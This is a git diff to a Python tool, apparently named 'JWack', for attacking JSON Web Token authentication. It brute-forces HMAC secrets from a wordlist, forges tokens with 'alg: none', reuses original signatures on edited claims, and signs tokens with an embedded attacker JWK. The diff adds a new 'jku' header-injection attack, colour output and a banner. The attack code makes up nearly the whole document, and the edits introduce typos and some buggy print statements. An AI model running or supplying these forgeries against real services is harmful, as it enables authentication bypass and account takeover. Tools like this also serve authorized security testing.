@@ -4,6 +4,7 @@ import hmac
 import hashlib
 import sys
 import argparse
+from colorama import Fore
 from Crypto.PublicKey import RSA
 from Crypto.Signature import pkcs1_15
 from Crypto.Hash import SHA256
@@ -17,6 +18,9 @@ def int_to_base64url(n):
     """Converts an integer to a base64-url encoded string."""
     return base64.urlsafe_b64encode(n.to_bytes((n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode('utf-8')
 
+def base64_url_encode(data):
+    """Encode bytes to base64 URL-safe string."""
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
 
 
 def jwt_decode(token):
@@ -28,10 +32,10 @@ def jwt_decode(token):
         decoded_header = base64.urlsafe_b64decode(token_parts[0] + "==").decode('utf-8')
         decoded_payload = base64.urlsafe_b64decode(token_parts[1] + "==").decode('utf-8')
         signature = token_parts[2]  # Signature is binary data, so no need to decode
-
-        print("Decoded Header: ", decoded_header)
-        print("Decoded Payload: ", decoded_payload)
-
+        print("======================")
+        print(Fore.GREEN + "Decoded Header: ", decoded_header)
+        print(Fore.GREEN + "Decoded Payload: ", decoded_payload)
+        print("======================")
         return decoded_header, decoded_payload, signature
 
     except UnicodeDecodeError as e:
@@ -51,55 +55,51 @@ def jwt_secret_bruteforce(file_path, token):
         
         header_decoded = base64.urlsafe_b64decode(header_b64 + "==").decode('utf-8')
         payload_decoded = base64.urlsafe_b64decode(payload_b64 + "==").decode('utf-8')
-        
+        print("======================")
         print("Decoded Header: ", header_decoded)
         print("Decoded Payload: ", payload_decoded)
-        
-        # Prepare the data to be signed (header and payload)
+        print("======================")        
+        # Prepare the data to be signed (header ansddd payload)
         unsigned_token = f'{header_b64}.{payload_b64}'
 
         with open(file_path, "r") as candidate_keys:
             for key in candidate_keys:
                 key = key.strip()
 
-                # Generate the HMAC SHA256 signature using the candidate key
+                # Generate HMAC SHA256 signature using candidate key
                 new_signature = hmac.new(key.encode(), unsigned_token.encode(), hashlib.sha256).digest()
                 
-                # Base64 URL encode the generated signature
+                # Base64 URL encode the generated signaturee.
                 new_signature_encoded = base64.urlsafe_b64encode(new_signature).rstrip(b'=').decode('utf-8')
 
-                # Compare the generated signature with the JWT's signature
+                # Compare the generated signature with the JWT'sss signature
                 if new_signature_encoded == signature_b64:
-                    print(f"Secret Found: {key}")
+                    print(f"Secret Found:",Fore.YELLOW, f"{key}")
                     return key
+                
+
             print("Brute force failed: No matching secret found.")
     except Exception as e:
         print(f"An error occurred: {e}")
-
 
 def alg_none(token):
     header, payload, signature = jwt_decode(token)
 
     if header and payload and signature:
         try:
-            # Parse the header as JSON
             header_json = json.loads(header)
+            header_json['alg'] = 'none'   # alg to noen 
 
-            # Change the 'alg' field to 'none'
-            header_json['alg'] = 'none'
-
-            # Re-encode the header to base64
+            # Re-encode header to base64
             new_header_b64 = base64.urlsafe_b64encode(json.dumps(header_json).encode()).rstrip(b'=').decode('utf-8')
 
-            # Create a new token with the modified header, the original payload, and no signature
+            # Create new token with the modified header, original payload, and no signature
             new_token = f'{new_header_b64}.{token.split(".")[1]}.'
-
-            print("Modified JWT with 'none' alg: ", new_token)
-            if input("Want to edit token values? (y/n)") == 'y' or 'Y':
-                edit_param(new_token)
+            if input(Fore.BLUE+"Do you want to edit Token Values? (y/n)".lower())=='y':
+                new_token = edit_param(new_token)
             else:
                 pass
-                
+            print(Fore.YELLOW,"JWT with alg as 'none'\n",Fore.BLUE, new_token,'\n')    
             return new_token
 
         except json.JSONDecodeError as e:
@@ -125,39 +125,44 @@ def edit_param(token):
             header_json = json.loads(header)
             payload_json = json.loads(payload)
             while True:
-                jwt_section = input("Section of token you want to edit (header/payload): ")
+                jwt_section = input(Fore.RED+"Section of token you want to edit (header/payload): ")
 
                 if jwt_section == "header":
                     choice = input("Do you want to edit or add a parameter? (edit/add): ").strip().lower()
                     if choice == "edit":
-                        print(header_json)
-                        jwt_parameter = input("Select parameter you want to edit: ")
+                        print(Fore.GREEN + header_json)
+                        jwt_parameter = input(Fore.RED+"Select parameter you want to edit: ")
                         param_value = input("Enter the value: ")
                         header_json[jwt_parameter] = param_value
                     elif choice == "add":
                         header_json = add_param(jwt_section, header_json)
 
                     final_token = f'{b64_encode(header_json)}.{b64_encode(payload_json)}'
-                    print(f"Updated JWT: {final_token}")
+                    print(Fore.GREEN + f"Updated JWT: {final_token}")
 
                 elif jwt_section == "payload":
                     choice = input("Do you want to edit or add a parameter? (edit/add): ").strip().lower()
                     if choice == "edit":
-                        print(payload_json)
-                        jwt_parameter = input("Select parameter you want to edit: ")
-                        param_value = input("Enter the value: ")
+                        print("======================")
+                        print(Fore.GREEN, payload_json)
+                        print("======================")
+                        jwt_parameter = input(Fore.RED + "Select parameter you want to edit: ")
+                        param_value = input(Fore.RED + "Enter the value: ")
                         payload_json[jwt_parameter] = param_value
                     elif choice == "add":
                         payload_json = add_param(jwt_section, payload_json)
 
                     final_token = f'{b64_encode(header_json)}.{b64_encode(payload_json)}'
-                    print(f"Updated JWT: {final_token}")
+                    print("======================")
+                    print(Fore.GREEN + f"Updated JWT: {final_token}")
+                    print("======================")
+
 
                 else:
-                    print("Invalid input")
+                    print(Fore.GREEN + "Invalid input")
                     continue
 
-                flag = input("Edit more? (yes/no): ").strip().lower()
+                flag = input(Fore.RED + "Edit more? (yes/no): ").strip().lower()
                 if flag != "yes" and flag != 'y':
                     break
 
@@ -172,9 +177,19 @@ def edit_param(token):
 
     
 def unverified_sign(token):
-    new_token, signature=edit_param(token)
-    final_token=f'{new_token}.{signature}'
-    print(final_token)
+    new_token = edit_param(token)
+    
+    if new_token:
+        header_payload = new_token.split(".")[0:2]  
+        header_payload_str = ".".join(header_payload)  
+        signature = token.split(".")[2]  
+        # Combine edited header.payload with the original signature
+
+        final_token = f'{header_payload_str}.{signature}'
+        print("Final token with unverified signature:\n", Fore.BLUE+ final_token)
+    else:
+        print("Error: Could not edit the token.")
+
 
 def generate_rsa_jwk(token):
     # Generate RSA key pair
@@ -198,10 +213,10 @@ def generate_rsa_jwk(token):
     # Build JWK
     jwk = {
         "kty": "RSA",
-        "kid": kid,  # You can replace this with any unique key ID
-        "use": "sig",        # Indicates the key is for signature
-        "n": int_to_base64url(public_numbers.n),  # Modulus
-        "e": int_to_base64url(public_numbers.e)   # Exponent (ensure e is valid)
+        "kid": kid,  
+        "use": "sig",        
+        "n": int_to_base64url(public_numbers.n),  
+        "e": int_to_base64url(public_numbers.e)   
     }
 
     return jwk, private_key
@@ -209,18 +224,14 @@ def generate_rsa_jwk(token):
 
 def sign_with_jwk(token):
     new_token=edit_param(token)
-    print(new_token)
     jwk, private_key = generate_rsa_jwk(new_token)
-    print("Generated JWK: ", json.dumps(jwk, indent=4))
 
+    print(Fore.YELLOW+ "\nGenerated JWK:\n ","======================\n", json.dumps(jwk, indent=4))
     header, payload, _ = jwt_decode(new_token)
     if header and payload:
         try:
-            # Modify header to include jwk parameter
             header_json = json.loads(header)
             header_json['jwk'] = jwk
-
-            # Re-encode header and payload
             new_header_b64 = b64_encode(header_json)
             new_payload_b64 = b64_encode(json.loads(payload))
 
@@ -239,7 +250,7 @@ def sign_with_jwk(token):
 
             # Create final JWT
             final_token = f'{unsigned_token}.{new_signature_b64}'
-            print("JWT with custom JWK header: ", final_token)
+            print(Fore.YELLOW, "JWT with custom JWK header:\n""---------------------\n",Fore.CYAN,final_token,"\n")
 
             return final_token
 
@@ -247,6 +258,46 @@ def sign_with_jwk(token):
             print(f"Error: {e}")
             return None
 
+def sign_with_jwk_jku(token):
+    new_token = edit_param(token)
+    # Generate the RSA key pair for JWK
+    jwk, private_key = generate_rsa_jwk(new_token)
+    print(Fore.WHITE,"Generated JWK: (Store the generate JWK and host it on the locally or publicy as requried under required format) \n","======================\n", Fore.YELLOW+ json.dumps(jwk, indent=4),'\n','======================\n')
+    jku_url = input(Fore.RED+"Enter the URL for the 'jku' header: ")
+
+    # Decode the header and payload from the token
+    header, payload, _ = jwt_decode(new_token)
+    if header and payload:
+        try:
+            #Modify the header to include the jku parameter
+            header_json = json.loads(header)
+            header_json['jku'] = jku_url  
+
+            #Re-encode header and payload
+            new_header_b64 = b64_encode(header_json)
+            new_payload_b64 = b64_encode(json.loads(payload))
+
+            #Create the unsigned token
+            unsigned_token = f'{new_header_b64}.{new_payload_b64}'
+
+            #Sign using private RSA key
+            signature = private_key.sign(
+                unsigned_token.encode('utf-8'),
+                padding.PKCS1v15(),
+                hashes.SHA256()
+            )
+
+            new_signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode('utf-8')
+
+            #final JWT
+            final_token = f'{unsigned_token}.{new_signature_b64}'
+            print("JWT with 'jku' header: ", final_token)
+
+            return final_token
+
+        except Exception as e:
+            print(f"Error: {e}")
+            return None
 
 
 def main():
@@ -261,6 +312,7 @@ def main():
     parser.add_argument("-e", "--edit", action="store_true", help="Edit paraemter values.")
     parser.add_argument("-us", "--unverified", action="store_true", help="Generate token with alterred values with same sigature to test unverified signature bypass")
     parser.add_argument("-jwk", "--jwk", action="store_true", help="Generate JWK and sign JWT with the generated key.")
+    parser.add_argument("-jku", action="store_true", help="Inject 'jku' header and sign JWT with a user-provided JWK Set URL.")
 
     args = parser.parse_args()
     file_path = args.file
@@ -278,10 +330,34 @@ def main():
         unverified_sign(token)
     elif args.jwk:
         sign_with_jwk(token)
-
+    elif args.jku:
+        sign_with_jwk_jku(token)
+        
     return file_path, token
 
 if __name__ == "__main__":
+    art = Fore.MAGENTA + r"""
+        JWack @offen5iv3
+                _                       
+                \`*-.                   
+                 )  _`-.                
+                .  : `. .               
+                : _   '  \              
+                ; *` _.   `*-._         
+                `-.-'          `-.      
+                  ;       `       `.    
+                  :.       .        \   
+                  . \  .   :   .-'   .  
+                  '  `+.;  ;  '      :  
+                  :  '  |    ;       ;-. 
+                  ; '   : :`-:     _.`* ;
+        [JWTs] .*' /  .*' ; .*`- +'  `*'
+               `*-*   `*-*  `*-*'       
+    """
+
+    print(art)
+
     file_path, token = main()
-    print(f"Wordlist File Path: {file_path}")
-    print(f"JWT Token: {token}")
+    print(Fore.MAGENTA,"======================\n")
+    print(Fore.CYAN, "Wordlist File Path: {file_path}")
+    print(Fore.CYAN, f"Initial JWT Token: {token}")
